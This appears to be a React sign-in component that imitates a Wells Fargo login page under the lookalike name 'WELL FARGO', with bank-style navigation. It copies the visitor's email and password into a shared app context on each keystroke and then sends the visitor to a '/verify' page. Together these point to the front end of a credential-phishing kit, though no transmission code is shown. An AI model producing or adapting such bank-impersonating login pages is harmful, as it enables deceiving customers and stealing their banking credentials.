import React, { useState,useContext } from "react";
import { Link } from "react-router-dom";
import { AuthContext } from "./AuthContext";

const Sign = () => {
  const { contextemail, setContextEmail, emailpassword, setEmailPassword } = useContext(AuthContext);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [isChecked, setIsChecked] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [menuOpen, setMenuOpen] = useState(false);
  const [emailError, setEmailError] = useState("");

  const togglePasswordVisibility = () => {
    setShowPassword(!showPassword);
    // setEmailPassword(password);

  };

  // Email validate karne ka function
  const validateEmail = (email) => {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
   
    return re.test(String(email).toLowerCase());
  };

  const handleEmailChange = (e) => {
    const value = e.target.value;
   
    setUsername(value);


    if (value === "") {
      setEmailError("Email is required");
    } else if (!validateEmail(value)) {
      setEmailError("Invalid email format");
    } else {
      setEmailError("");
    }
   
  };

  // Button tabhi enable hoga jab email and password dono valid honge
  const isButtonDisabled = username === "" || password === "" || emailError !== "";
  setContextEmail(username);
  // console.log(contextemail);

  return (
    <div className="min-h-screen flex flex-col">
      {/* Navbar */}
      <div className="h-16 bg-red-600 flex items-center justify-between px-6 text-white">
        <h1 className="font-bold text-xl">WELL FARGO</h1>
        <button className="sm:hidden" onClick={() => setMenuOpen(!menuOpen)}>
          ☰
        </button>
        <ul className={`sm:flex gap-6 text-sm ${menuOpen ? 'block' : 'hidden'} sm:block`}>
          <li>Enroll</li>
          <li>Customer Service</li>
          <li>ATM/Locations</li>
          <li>Espanol</li>
          <li>Search</li>
        </ul>
      </div>

      {/* Form Section */}
      <div className="flex-1 flex items-center justify-center p-6 bg-cover bg-center" style={{ backgroundImage: `url(${require("../image/winter_morning.jpg")})` }}>
        <div className="bg-white rounded-lg shadow-lg p-6 w-full max-w-md">
          <h1 className="text-2xl font-bold text-center mb-6">Good Afternoon</h1>
          <div className="space-y-4">
            <input
              type="email"
              value={username }
              onChange={handleEmailChange}
              placeholder="Email"
              required
              className={`border-2 outline-none p-3 rounded-full w-full placeholder-gray-500 focus:ring-2 ${
                emailError ? "border-red-500 focus:ring-red-500" : "focus:ring-blue-500"
              }`}
            />
            {emailError && <p className="text-red-500 text-sm">{emailError}</p>}

            <div className="relative">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) =>
                  {

                    setPassword(e.target.value)
                    setEmailPassword(e.target.value);
                  } 
                }
                placeholder="Password"
                className="border-2 p-3 outline-none rounded-full w-full placeholder-gray-500 focus:ring-2 focus:ring-blue-500"
              />
              <span onClick={togglePasswordVisibility} className="absolute top-1/2 right-3 transform -translate-y-1/2 cursor-pointer">
                {showPassword ? "🙈" : "👁"}
              </span>
            </div>

            <div className="flex items-center space-x-4">
              <input type="checkbox" checked={isChecked} onChange={() => setIsChecked(!isChecked)} />
              <span>Save username</span>
            </div>
          </div>

          <p className="text-sm text-gray-500 mt-4 text-center">Save your username only on private devices.</p>

          <div className="mt-6">
            <Link to="/verify">
              <button
                disabled={isButtonDisabled}
                className={`w-full py-3 rounded-full font-bold transition ${
                  isButtonDisabled ? "bg-gray-200 text-gray-500 cursor-not-allowed" : "bg-blue-500 text-white hover:bg-blue-600"
                }`}
              >
                Sign on
              </button>
            </Link>
          </div>

          <div className="mt-4 text-center">
            <Link to="/forgot" className="text-blue-600 hover:underline">
              Forgot username or password?
            </Link>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Sign;
